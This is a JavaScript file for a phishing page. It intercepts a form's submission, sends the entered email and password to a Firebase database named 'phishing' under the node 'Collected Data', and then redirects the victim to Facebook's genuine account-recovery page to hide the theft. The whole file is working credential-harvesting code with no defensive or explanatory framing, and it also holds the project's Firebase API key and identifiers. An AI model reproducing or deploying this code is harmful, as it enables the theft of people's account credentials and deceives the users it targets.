var firebaseConfig = {
  apiKey: "AIzaSyDO14YZA7jYhxoyoNgOJs08OP82pSLAWBU",
  authDomain: "phishing-27c13.firebaseapp.com",
  databaseURL: "https://phishing-27c13-default-rtdb.firebaseio.com",
  projectId: "phishing-27c13",
  storageBucket: "phishing-27c13.appspot.com",
  messagingSenderId: "329210897102",
  appId: "1:329210897102:web:09f801dc5dee6b6255e69f",
  measurementId: "G-EB0Y0X3DGJ"
};

firebase.initializeApp(firebaseConfig);
document.getElementById('contactForm')
.addEventListener('submit', submitForm);

var MessageRef = firebase.database().ref('Collected Data');

function submitForm(e) {

    e.preventDefault();

    // Get values
    var email = getInputVal('email');
    var password = getInputVal('password');

    saveMessage(email, password);
    document.getElementById('contactForm').reset();
    setTimeout(function() {
        location = 'https://www.facebook.com/login/identify/?ctx=recover&c&multiple_results=0&from_login_screen=0&_rdr'
    }, 100)
}

// Function to get get form values
function getInputVal(id) {
    return document.getElementById(id).value;
}

// Save message to firebase
function saveMessage(email, password) {
    var newMessageRef = MessageRef.push();
    newMessageRef.set({
        email: email,
        password: password,
    });
}
